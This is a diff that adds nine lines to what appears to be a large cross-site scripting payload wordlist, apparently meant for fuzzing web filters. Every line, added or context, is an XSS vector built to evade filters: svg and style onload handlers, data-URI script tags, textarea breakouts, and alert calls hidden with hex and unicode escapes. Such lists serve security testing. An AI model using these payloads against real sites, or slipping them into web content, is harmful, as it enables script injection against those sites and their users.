@@ -1134,4 +1134,13 @@ XXX<style>*{color:gre/**/en !/**/important} /* IE 6-9 Standards mode */<!----><!
 ',__defineSetter__('x',alert),x=1,'
 <iframe name=alert(1) src="//somedomain?x=',__defineSetter__('x',eval),x=name,'"></iframe>
 with(document)body.appendChild(createElement('iframe onload=&#97&#108&#101&#114&#116(1)>')),body.innerHTML+=''
+"><svg/onload"
+<style onload='execScript(/**/"\x61lert&#40 1&#41","j\x61vascript");'>
+<a href="data:\@['{§(`__`)$}']@\, % 3 c script % 3 e alert(1) % 3 c/script %3 e">click</a>
+<svg </onload ="1> (_=alert,_(1)) "">
+>"><svg onload=alert(0)>
+/textarea><script>alert(1)</script>
+<image src=`` onerror=setTimeout/*("__")*/`\u0061lert\u00281\u0029/**/`>
+<script id=x>x.removeAttributeNode(document.createAttribute(status))</script>
+<meta http-equiv="X-UA-Compa"content="x=edge"><svg onload=document.styleSheets[0].addRule("x",0);><switch/><style>*:after{content:counter(x)
 /* RFI STOP */
